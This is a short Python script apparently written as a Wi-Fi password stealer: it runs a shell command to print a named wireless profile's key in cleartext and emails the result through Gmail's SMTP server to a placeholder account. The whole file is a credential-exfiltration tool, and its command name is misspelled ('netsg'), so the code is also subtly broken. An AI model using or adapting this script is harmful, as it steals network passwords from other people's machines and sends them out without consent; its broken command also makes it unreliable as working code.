#!/usr/bin/env python

import subprocess, smtplib

def send_mail(email,password, message):
        server= smtplib.SMTP("smtp.gmail.com", 587)   
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit() 

command = "netsg wlan show profile UPC723762 key=clear"
result= subprocess.check_output(command, shell=True)
send_mail("YOUR MAIL ID(GOOGLE)", "YOUR PASSWORD", result)
